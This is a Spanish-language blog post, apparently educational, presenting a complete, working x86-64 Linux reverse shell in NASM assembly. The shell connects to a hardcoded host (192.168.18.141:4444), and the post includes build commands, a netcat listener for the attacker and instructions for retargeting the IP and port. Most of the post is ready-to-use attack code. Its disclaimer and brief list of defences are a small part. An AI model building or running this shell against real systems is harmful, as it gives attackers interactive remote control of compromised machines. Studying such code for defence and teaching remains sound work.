---date: 2025-10-16 11:00:00 +0200
tags: [post, reverse-shell, hacking, linux, asm]
excerpt: "Implementación mínima de una reverse shell TCP x86-64 en Linux usando solo syscalls (socket, connect, dup2, execve), con pasos de compilación y uso."
---

---
date: 2025-10-16 10:00:00 +0200
categories: [assembly, security, low-level]
---

## Introducción

Una **reverse shell** es una técnica donde la máquina comprometida inicia una conexión saliente hacia el atacante, quien queda a la escucha. A diferencia de una bind shell (donde el objetivo escucha), la reverse shell sortea firewalls que bloquean conexiones entrantes pero permiten salientes.

En este post vamos a diseccionar una implementación minimalista en **assembly x86-64** para Linux, usando únicamente syscalls del kernel. El objetivo es educativo: entender cómo funciona a bajo nivel, qué syscalls intervienen y cómo se ensamblan para crear un canal de comunicación completo.

---

## Arquitectura de la Reverse Shell

El flujo es simple pero efectivo:

1. **SOCKET**: Crear un socket TCP/IPv4
2. **CONNECT**: Conectar al IP:puerto del atacante
3. **DUP2**: Redirigir stdin, stdout y stderr al socket
4. **EXECVE**: Ejecutar `/bin/sh` (shell interactiva)

Una vez completados estos pasos, el atacante tiene control total sobre la shell del sistema comprometido.

---

## Código Completo

```nasm
; ============================================================================
; =     Reverse Shell (TCP) (Linux x86-64) — EDUCATIONAL PURPOSES ONLY       =
; =                        With <3 by 574R — No guarantees.                  =
; ============================================================================

section .text
global _start
_start:

    ; ========================================================================
    ; 1. SOCKET (syscall 41)
    ; ========================================================================
    ; Crea un socket TCP/IPv4 y guarda su file descriptor en r8
    
    mov rax, 41        ; syscall: socket
    mov rdi, 2         ; AF_INET (IPv4)
    mov rsi, 1         ; SOCK_STREAM (TCP)
    xor rdx, rdx       ; protocol = 0 (default para TCP)
    syscall

    mov r8, rax        ; Guardamos el FD del socket en r8

    ; ========================================================================
    ; 2. CONNECT (syscall 42)
    ; ========================================================================
    ; Conecta el socket a la IP:puerto del atacante (192.168.18.141:4444)
    
    mov rax, 42        ; syscall: connect
    mov rdi, r8        ; FD del socket
    
    ; Construimos la estructura sockaddr_in en la pila (16 bytes):
    ; Offset | Campo        | Valor      | Descripción
    ; -------|--------------|------------|---------------------------
    ; 0-1    | sin_family   | 0x0002     | AF_INET (2)
    ; 2-3    | sin_port     | 0x5c11     | Puerto 4444 (big-endian)
    ; 4-7    | sin_addr     | 0x8d12a8c0 | IP 192.168.18.141 (big-endian)
    ; 8-15   | sin_zero     | 0x00...    | Padding (8 bytes a cero)
    
    xor r9, r9         ; r9 = 0
    push r9            ; Padding (8 bytes de ceros)
    mov r10, 0x8d12a8c05c110002  ; IP + puerto + familia (empaquetados)
    push r10           ; Empujamos la estructura completa
    
    mov rsi, rsp       ; rsi apunta al tope de la pila (struct sockaddr_in)
    mov rdx, 16        ; Tamaño de sockaddr_in (16 bytes)
    syscall

    ; ========================================================================
    ; 3. DUP2 (syscall 33) - Loop para redirigir stdin/stdout/stderr
    ; ========================================================================
    ; Duplica el socket FD sobre los descriptores estándar (0, 1, 2)
    ; Esto hace que cualquier entrada/salida de la shell vaya por el socket
    
    xor rsi, rsi       ; Contador = 0 (stdin)
.dup2:
    mov rax, 33        ; syscall: dup2
    mov rdi, r8        ; oldfd = socket FD
                       ; newfd = rsi (0, 1, 2 en cada iteración)
    syscall
    
    inc rsi            ; Incrementar contador
    cmp rsi, 3         ; ¿Ya duplicamos 0, 1 y 2?
    jl .dup2           ; Si no, repetir

    ; ========================================================================
    ; 4. EXECVE (syscall 59)
    ; ========================================================================
    ; Reemplaza el proceso actual por /bin/sh
    ; Como stdin/stdout/stderr apuntan al socket, la shell es interactiva
    ; a través de la conexión TCP
    
    mov rax, 59        ; syscall: execve
    
    ; Construimos la cadena "/bin/sh" en la pila:
    push 0             ; Null terminator
    mov r11, 0x68732f6e69622f  ; "/bin/sh" en little-endian
                                ; (6E 69 62 2F 73 68 = n i b / s h)
    push r11
    mov rdi, rsp       ; rdi = puntero a "/bin/sh"
    
    ; argv = ["/bin/sh", NULL]
    push 0             ; argv[1] = NULL
    mov rsi, rsp       ; rsi = puntero al array argv
    
    ; envp = NULL
    push 0
    mov rdx, rsp       ; rdx = puntero a envp (vacío)
    
    syscall

.done:
    ; Si execve falla (no debería), salimos limpiamente
    mov rax, 60        ; syscall: exit
    xor rdi, rdi       ; exit code = 0
    syscall
```

---

## Desglose por Syscalls

### 1. SOCKET (RAX 41)

Crea un **objeto de comunicación** y devuelve un file descriptor (FD). En este caso, un socket TCP/IPv4.

**Argumentos:**
- `rdi = 2` → `AF_INET` (familia IPv4)
- `rsi = 1` → `SOCK_STREAM` (TCP, orientado a conexión)
- `rdx = 0` → Protocolo por defecto (TCP para `SOCK_STREAM`)

**Retorno:**
- `rax ≥ 0` → FD del socket creado
- `rax < 0` → Error (EAFNOSUPPORT, EMFILE, etc.)

El socket recién creado es solo una estructura en memoria del kernel. No tiene IP ni puerto asignados hasta que se haga `bind()` (para servidores) o `connect()` (para clientes).

---

### 2. CONNECT (RAX 42)

Inicia el **handshake TCP** (SYN → SYN/ACK → ACK) con el servidor remoto especificado en la estructura `sockaddr_in`.

**Argumentos:**
- `rdi = r8` → FD del socket (devuelto por `socket()`)
- `rsi = rsp` → Puntero a `struct sockaddr_in` (16 bytes en la pila)
- `rdx = 16` → Tamaño de la estructura

**Estructura sockaddr_in (big-endian):**

| Offset | Campo | Valor | Descripción |
|--------|-------|-------|-------------|
| 0-1 | `sin_family` | `0x0002` | AF_INET (2) |
| 2-3 | `sin_port` | `0x5c11` | Puerto 4444 (htons) |
| 4-7 | `sin_addr` | `0x8d12a8c0` | 192.168.18.141 (orden de red) |
| 8-15 | `sin_zero` | `0x00...` | Padding (8 bytes) |

> **Nota sobre endianness:** Las direcciones de red siempre van en **big-endian** (orden de red). Por ejemplo, el puerto 4444 decimal (0x115C) se representa como `0x5c11` en memoria porque x86-64 es little-endian pero la red espera big-endian.

**Retorno:**
- `rax = 0` → Conexión establecida
- `rax < 0` → Error (ECONNREFUSED, ETIMEDOUT, ENETUNREACH, etc.)

---

### 3. DUP2 (RAX 33)

Duplica un file descriptor sobre otro, cerrando primero el destino si estaba abierto. Ambos FDs quedan apuntando a la misma **open file description** (mismo offset y flags).

**Argumentos:**
- `rdi = r8` → `oldfd` (socket FD)
- `rsi = 0, 1, 2` → `newfd` (stdin, stdout, stderr)

**Efecto:** Después del loop, cualquier lectura de stdin o escritura a stdout/stderr del proceso se redirige al socket TCP. Cuando se ejecute la shell, su entrada/salida viajará por la red.

**Retorno:**
- `rax = newfd` → Éxito
- `rax < 0` → Error (EBADF, EMFILE)

---

### 4. EXECVE (RAX 59)

Reemplaza la imagen del proceso actual por `/bin/sh`. El PID no cambia, pero el código, heap y stack se descartan completamente.

**Argumentos:**
- `rdi = rsp` → Puntero a `"/bin/sh\0"` (cadena C en la pila)
- `rsi = rsp` → Puntero a `argv` (array terminado en NULL)
- `rdx = rsp` → Puntero a `envp` (array vacío terminado en NULL)

**Consideraciones importantes:**
- Los **FDs permanecen abiertos** salvo los marcados con `FD_CLOEXEC`
- Las **señales personalizadas se resetean** a default
- El **PID, directorio de trabajo y umask se conservan**

**Retorno:**
- No hay retorno si tiene éxito (el proceso "es" ahora `/bin/sh`)
- `rax < 0` → Error (ENOENT, EACCES, ENOEXEC, etc.)

---

## Compilación y Uso

### Compilar el shellcode:

```bash
nasm -f elf64 reverse_tcp_x86-64.asm -o reverse_tcp.o
ld reverse_tcp.o -o reverse_tcp
```

### En la máquina atacante:

```bash
nc -lvnp 4444
```

### En la máquina objetivo:

```bash
./reverse_tcp
```

Si todo funciona correctamente, obtendrás una shell interactiva en el listener de netcat.

---

## Modificaciones y Personalización

Para adaptar esta reverse shell a tu entorno:

1. **Cambiar IP destino:** Modifica el valor `0x8d12a8c0` (192.168.18.141 en big-endian)
2. **Cambiar puerto:** Modifica `0x5c11` (4444 en big-endian)

**Ejemplo:** Para conectar a `10.0.0.1:8080`:
- IP: `10.0.0.1` → `0x0100000a` (big-endian)
- Puerto: `8080` → `0x1f90` (big-endian)
- Valor completo: `0x0100000a1f900002`

```nasm
mov r10, 0x0100000a1f900002
```

---

## Consideraciones de Seguridad

⚠️ **Disclaimer:** Este código es **exclusivamente educativo**. Su uso malicioso es **ilegal** y puede acarrear consecuencias penales graves.

**Defensa contra reverse shells:**
- Firewalls de salida (egress filtering)
- Monitoreo de conexiones salientes inusuales
- IDS/IPS con reglas para detectar patrones de shells
- SELinux/AppArmor para restringir `execve()` y `connect()`
- Análisis de procesos que llaman syscalls sospechosas

---

## Conclusión

Esta reverse shell demuestra la potencia de las syscalls directas: en menos de 60 líneas de assembly, hemos construido un canal bidireccional completamente funcional. Entender estos fundamentos es crucial tanto para desarrollar exploits como para defenderse de ellos.

En futuros posts exploraremos:
- Técnicas de evasión (cifrado del tráfico, ofuscación)
- Bind shells y su comparativa
- Inyección de shellcode en procesos remotos
- Bypass de ASLR y DEP

¡Gracias por leer! Si tienes preguntas o sugerencias, no dudes en contactarme.

---

**Tags:** #assembly #x86-64 #syscalls #reverse-shell #security #linux #low-level